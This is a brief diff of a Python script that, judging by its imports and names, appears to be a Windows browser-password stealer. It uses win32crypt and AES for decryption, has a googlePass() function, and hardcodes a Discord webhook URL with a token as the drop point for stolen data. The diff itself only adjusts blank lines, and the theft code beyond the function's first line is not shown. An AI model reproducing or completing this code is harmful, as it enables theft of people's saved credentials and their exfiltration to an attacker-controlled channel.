@@ -1,5 +1,4 @@
 # -*- coding: utf-8 -*-
-
 from discord_webhook import DiscordWebhook, DiscordEmbed
 import os
 import json
@@ -9,6 +8,7 @@ import shutil
 from datetime import datetime, timedelta
 import win32crypt
 from Crypto.Cipher import AES
+
 discord_url = "https://discord.com/api/webhooks/1085638654266978385/7GLQ8GzmbQjY-xmc3W52EkNLFbtauAqd8IOWN0RUBikG7BGpG-n3QBzP9onOmt0nI7IF"
 def googlePass():
     user = os.getlogin()
